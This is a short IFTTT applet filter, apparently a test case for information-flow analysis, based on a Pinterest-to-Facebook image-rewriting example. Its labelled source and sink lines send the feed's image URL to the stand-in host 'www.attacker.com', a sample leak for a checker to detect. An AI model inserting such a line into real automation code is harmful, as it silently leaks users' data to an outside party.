// https://stackoverflow.com/questions/44249787/ifttt-filter-code-for-pinterest-rss-feed

// Applet that uses Pinterest RSS to post to Facebook.
//
// It replaces all 236x strings with 564x in the RSS feed result.

// Trigger: Pinterest RSS
// Action: FacebookPages.createPhotoPage

trigger_url = urlh(lbl('Feed.newFeedItem.EntryImageUrl'));
newurl = trigger_url.replace(/236x/g,'564x');
attack = urll("www.attacker.com?" + newurl);
// FacebookPages.createPhotoPage.setPhotoUrl("www.attacker.com?" + newurl);
sink('FacebookPages.createPhotoPage.setPhotoUrl', attack);
